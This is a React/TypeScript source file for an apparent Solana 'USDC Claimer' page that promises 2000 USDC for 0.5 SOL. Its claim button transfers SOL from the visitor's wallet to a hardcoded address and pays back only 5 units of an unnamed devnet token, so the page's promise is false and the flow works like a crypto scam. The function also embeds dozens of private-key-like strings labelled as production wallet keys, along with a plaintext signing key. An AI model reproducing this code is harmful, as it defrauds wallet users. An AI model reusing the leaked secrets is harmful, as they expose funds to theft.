/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "513YUVEWU818TfeCtpCNyqx9fBadZEZiuujgcNfCjd1xEi1P77EtmDgG3fzP6WHxTiMATgymUBCgJHNTMteRL5mN"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3zow5JKURJnmzsDbBPj5vaQXqbK2XfAadRANvy1YhgyjHDEW8TCEb3FR574FrBauWEHtdXZpXLESSP7YvRD8dy9D",
  "key1": "csSG2JHJuM1RbXrgYgfBBHArW7ydnvfWSSWYrw2aCuA3aEapbYo7GPbLZfiaucG73hakSDrhJL9EFvwJ7iNKCSm",
  "key2": "2ixyAj7MXXchZ19PAdtNdHkWYms2gFtvMDzGejVvkgfNAVFurhCcjWzqNAxmw1xBAYGMGXiKSwK4aciEzXqSEvPN",
  "key3": "5d4VD33Z4mWTZFX6hzj9zU1VMJP8zSaJYVDBHwuXxM9bBhCQjoKRtfrkPahxNBbtapBwHFHJZNzxcjPtppW9s8d3",
  "key4": "5GZmLovPddrrBqLK4hiZkTXFahycoGhp8aHdPn9g9vpFDdsEEtmPSxqy2Md7K3XYnHjqCs8D4yrYerPQp1nAmwW4",
  "key5": "21YrxcwUntJa2pjRTb3zbaFPjEeFt6vvFz9GYL1jR4HXtc1SCwRhDggexpnYFfCXauVPvJDCE5S19AnAJoepsqsH",
  "key6": "3mTXvho9DtnV6Rd2nL2Qu6N44Fc6AbsbFLEGobDBaVoKoABTCkEpg4kUxcEAjZtnCjqtaoWCJVP4yfNWXByHPhgU",
  "key7": "45XQ7mMfQfEsTed24EXaFsVfPAi2QiHAaMcySW3KHsrukbJ3nU7nbRmPdP3UintoQcugme1vcT1SWWy7SKx1RhwS",
  "key8": "3yNHpc6x7trKRpH9vsCTTxNqnzfVEyK7PUkrWGapuCP7a3sMTorP6wed58FKjtkFqiKHkGodbGJ9Myp7yL8w4gEN",
  "key9": "H3w4cjNJVFD7X5DP5SmvqhxxjooGJqLA8aeGVo1Zzv1tphksDG56FCyBsa8YcNUNqayrue4fs3pXgEDHP13Ugme",
  "key10": "5A4qGc6e2cRZMAxxRP7g3fij6iEbWctWzLq5Y5d4WknQEAXR5mMW5vP2PwzuGQmm5VvTn88QR3uQVCK7nQghGE8p",
  "key11": "3cQLJzb38JvPMVE2SF7D6yn47xqrd6zDGoLe4rRBBerMostkrJGbxZ3K3e2xegp9StXe2CvT2XWk332WadjSFaPu",
  "key12": "WxuHAfunEvXpLEPz1tMaPW1e8uhDVNKHzAn3jWu6MbHJZut3Z2VRdwuhJExGQLxKJvLHogy68XTWKamQdMpMASm",
  "key13": "47tNp9xXa6MKkYMa94MrsMmgbGpX89U7GQCAbSeADRcmPcCkqozJSFmJoUgHCCH1NPyCvCLrSwYaT18v3K3di85y",
  "key14": "kKXWfWMNfqdmXLf1uFPRiEJTNY4D2RRNrupVJfRoUgXNta9NX3GWy7QD9UsnRgAKauU3HJhrEbrD7moP5ZUSzsz",
  "key15": "2XPus7Pvhx6S9MgX8f1U9BPe6Zw3qmfgJc7tW7GeGJNaGUamxpSDopKGgfsESYJw2NLv6Vvrwx1g1a5Un5xvnsnY",
  "key16": "26o5ES11JVJbMjG3WfFk82yUxLHS7zPZrMt9vEczFwUn2df9k7CTNZy52eJ82UPSVjSD9yvkaA6bWxrK4HkYgYX9",
  "key17": "4BX5U5ENMPu3gpgXuLw7ScoGQ5aDG8WpyUVB4tJVYbhP5TYbZcLeitcSqd5RZqJUSE4re4zsGFFdcrhTiQX7iaGk",
  "key18": "JP4pkSAvUApfnGD1AaFtD1ux84XQp7CrVWWVwKZm8bLrkavdPXUKQD6Pn1Qm98otSQpWc8Y4FzP5ZyyDeJUnQbh",
  "key19": "MKa9s6h1Uq92nuTBXvNaYE9v8TfNrueh2wxCk7hsGH4kxthRknfApgDhSJLUM6rfpDSk2e9dbsjqV7duuba9LVz",
  "key20": "5x7RQxYbVUQuUSQ1QHeTjTGWh1dYq8VvuNscko7FYKjWQfzhJ2ptquAhVR8nSZ5s5SQcTb9SuU2KUZbUejiSmzCu",
  "key21": "4LCrMzmv4Rpucvs4pKVzytFTQgoPfu3ujwAAy2wJNWtkpPFejUGuiUuu5ao9q8XK2poDUzqmY6XQ48s6urSbXMC2",
  "key22": "55xkfHLRurBneUTfh7sMTMdPtVvsqP3b563xwCrwE6bKFmARsojAVbZUQjFHnUTXRff5UacjS7JWsSjBp6Lccju8",
  "key23": "5ZuBv2VpnM3HMfiahTUqnTYhbE5gK44xPVzhMzgL3RYWXv2m8p77522gRwM1qKSxAviV8NcBaujSuDC9eRW4B3jB",
  "key24": "4FhFBmd6EngAaexCz6QJkgmArmhNDHANJXUgdRTULAk91h2zYpvR7ME9NkzRKF1DJ75hvtVx3TyXs21zQRsYyz1w",
  "key25": "XzfBntFVaR7KqQHjdTsRED1CRwY8tfM9MjHkumquGX162K2aATFuvLkPe3XxGSv9GMij7G54WBdo948G8pLPL7s",
  "key26": "2LzdF7Wef8TmCVkpe5zzPtJVzpmojGCWEr22iVDU76ry9yrmLGKj9S8Eb72TcefqMVHXCsr4w1vWxGRGPZL44PfQ",
  "key27": "24CdgZuouY2CZbsfcLYn8ZM3utU4bmmvKf9XsiABZsxH1eZsPx56zxq8YCKUmAbaCdLpAjSnhdBP924iszGAesxT",
  "key28": "4SnuLT9Zi34BCCKiCbsoNzKXEcNcWwbzaTRQnb4UzXhScZMKH2zYhefSnwhnHVtuM1aDMxunwu7fPy2jppcsDErv",
  "key29": "4i4uxvAXJ35Zxts7HncNc2bVZKSVkccm1BigxS2cbwRtFP5v2hGaqzZxBeLb4FchN5peM6YBu6Zhk7XmNCzwpHr3",
  "key30": "3bsHm68KGu78HF4ecySdhSzt3ZzRwiEWS2pCsNmY7CF7eL1agVb3rHbxadtf3FmMy1DqEKqacwgfjgXJVQpuxFBu",
  "key31": "5NVJvJTSvZSRgpgygTMHnCogHtDsezjiN6dP71z8kseiWn5Kuas95tuawd4x11LemBrwhdZbv4M6TH81MgG9iofP",
  "key32": "61FN56UzwHs6BagBqjJbCMsSBDaepYgCPNF6FYuxMa1cvrcaxWBSzMX7jJcqaTSr4WmeGfmZtJmmRUNEkfVZrLKq",
  "key33": "5sMcbWS7CZWxP2PZYHzpuPVn7WLu2oJxmBrsPwUiBpcQC62e4GXsYJ9wgxYHDJNETgu2RgLUM9FiT7sfsWdnZJVA",
  "key34": "3ZXTQyajVEQDSiRNuhnmbE2EJZs9ytiY8MiEWyeyYwzTpxHSgLQhVMz6AuB8p2f2XRCsQ9GQfq2E1YGuYh2HpfyE",
  "key35": "29X93Mxj3mYAYRW8DECAAb1vzRNQuMUJEirSUs8q2RmaNeaGwB3SdSRq6D1Gu3TNUnww8bn6XAPsuzs5CB8BVkxG",
  "key36": "4nSyuSEajNRwFtGoUpYe4x5nMnmUwBnN7WsTdH77rkfq8Ktz1fjmHzhddsP9a4pBFngxohBvU7EPubBcZL1GzTKW",
  "key37": "MNTGfqUgp8vEkKnMAiYxWRmFXJPq39BFTyqapnwUqvZL1bLNGkoZHHhDLX4Lh9dCco7BGegMWL91doGCJmVtCJC",
  "key38": "2nPLDEAHdowDbYmZrW8vfhF2ZjbdRxfN99LnBGhh721JQf4rgGk5bGKUyhwVRmmhd2y4PjHUFu2dFHhXKB2qonDn",
  "key39": "4jtbsReHXNQFEJBvaMGn1rg17fyuPpcg1JZi6hnBrzWfrFey1SMELAnSJBaedxWjxF2m5NtVPCjjHCxnnGF3MNAd",
  "key40": "3ZYPUHWFAvgcSbDHz5nwG9cLDbWJMQhh64qkYNZqGFiFBHcfEFdBmPUoekMGKaVqzKeNJ8qVqadkpJ8sGdVsXLxS",
  "key41": "64mrkHZwkNXUpSMQkJ5ZqK4hAJtupU3beVEXP2aqn5WJYaLjAFTHobCbPdMP68LfySSMo9cq7stLEr66epRUQPTq",
  "key42": "3QcfYx4RwPbE2oD2bareNSVhEzz7hRWNxxGdqaZq5HW1HEnCdnzSVy4VpxDcHjiptq5hzemvxvf42AzgV487pQNd"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
